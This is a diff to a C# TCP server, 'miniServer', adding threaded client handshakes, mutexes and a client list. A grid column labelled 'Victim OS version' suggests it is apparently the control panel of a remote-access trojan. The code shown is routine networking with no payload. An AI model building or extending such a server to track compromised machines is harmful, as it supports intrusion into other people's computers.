@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
@@ -11,8 +12,13 @@ namespace miniServer
     {
         //must be same in client and server.
         const string separator = "|||";
+        private static Mutex gridMutex = new Mutex();
+        private static Mutex idMutex = new Mutex();
+
         Thread serverThread;
         TcpListener serverTcp;
+        List<miniClient> clientList = new List<miniClient>();
+
 
         public ServerForm()
         {
@@ -72,42 +78,45 @@ namespace miniServer
                     var tcpClient = serverTcp.AcceptTcpClient();
                     byte[] helloBytes = null;
 
-                    try
+                    ThreadPool.QueueUserWorkItem(param =>
                     {
-                        NetworkStream stream = tcpClient.GetStream();
-                        byte[] bytes = new byte[4096];
-                        int byteread = stream.Read(bytes, 0, bytes.Length);
-
-                        helloBytes = new byte[byteread];
-                        Array.Copy(bytes, helloBytes, byteread);
-
-                        string incomming = Encoding.UTF8.GetString(helloBytes);
-                        string[] stringSeparators = new string[] { separator };
-                        string[] receive = incomming.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
-                        //Recived: clientid<separator>osVersion<separator>clientversion<separator>HostName
-                        if (receive.Length == 4)
+                        try
                         {
-                            int id = int.Parse(receive[0]);
+                            NetworkStream stream = tcpClient.GetStream();
+                            byte[] bytes = new byte[4096];
+                            int byteread = stream.Read(bytes, 0, bytes.Length);
 
-                            string hostName = receive[3];
+                            helloBytes = new byte[byteread];
+                            Array.Copy(bytes, helloBytes, byteread);
 
-                            //A new client
-                            AddNewClienet(tcpClient, receive[1], receive[2], receive[3], incomming, hostName);
-                            return;
+                            string incomming = Encoding.UTF8.GetString(helloBytes);
+                            string[] stringSeparators = new string[] { separator };
+                            string[] receive = incomming.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
+                            //Recived: clientid<separator>osVersion<separator>clientversion<separator>HostName
+                            if (receive.Length == 4)
+                            {
+                                int id = int.Parse(receive[0]);
 
+                                string hostName = receive[3];
+
+                                //A new client
+                                AddNewClienet(tcpClient, receive[1], receive[2], receive[3], incomming, hostName);
+                                return;
+
+                            }
+                            else//incorect recive data
+                            {
+                                writelog(tcpClient.Client.RemoteEndPoint.ToString() + "Connection Hello is incorrect :( ",
+                                    string.Format("Error Data={0}\nRecive Data={1} ", incomming, Encoding.UTF8.GetString(helloBytes, 0, byteread)));
+                                return;
+                            }
                         }
-                        else//incorect recive data
+                        catch (Exception ex)
                         {
-                            writelog(tcpClient.Client.RemoteEndPoint.ToString() + "Connection Hello is incorrect :( ",
-                                string.Format("Error Data={0}\nRecive Data={1} ", incomming, Encoding.UTF8.GetString(helloBytes, 0, byteread)));
+                            writelog(tcpClient.Client.RemoteEndPoint.ToString() + " Error wile client connecting :( ", ex.Message + "\n" + Encoding.UTF8.GetString(helloBytes, 0, helloBytes.Length));
                             return;
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        writelog(tcpClient.Client.RemoteEndPoint.ToString() + " Error wile client connecting :( ", ex.Message + "\n" + Encoding.UTF8.GetString(helloBytes, 0, helloBytes.Length));
-                        return;
-                    }
+                    }, null);
                 }
             });
             serverThread.IsBackground = true;
@@ -117,7 +126,10 @@ namespace miniServer
 
         void AddNewClienet(TcpClient tcpClient, string os, string version, string keyClient, string incomming, string hostName)
         {
-            miniClient mc = new miniClient(1, tcpClient, os, version, hostName);
+            idMutex.WaitOne();
+            miniClient mc = new miniClient(clientList.Count, tcpClient, os, version, hostName);
+            clientList.Add(mc);
+            idMutex.ReleaseMutex();
 
             //Hello is for future use
             mc.SendToClient(mc.ID.ToString() + separator + "Hello");
@@ -134,11 +146,13 @@ namespace miniServer
             row.Cells[5].Value = mc.OS;//Victim OS version
             row.Cells[6].Value = mc.Version;//Client Version
             row.Cells[7].Value = "Yes";//isAlive
+
+            gridMutex.WaitOne();
             dataGridViewClients.Invoke((MethodInvoker)delegate
             {
                 dataGridViewClients.Rows.Add(row);
             });
-
+            gridMutex.ReleaseMutex();
             writelog(mc.IP + " -> Connected :)", mc.IP + " -> Connected :) : " + incomming);
         }
 
@@ -168,6 +182,6 @@ namespace miniServer
             writelog("Server Stopped.", null);
         }
 
-       
+
     }
 }
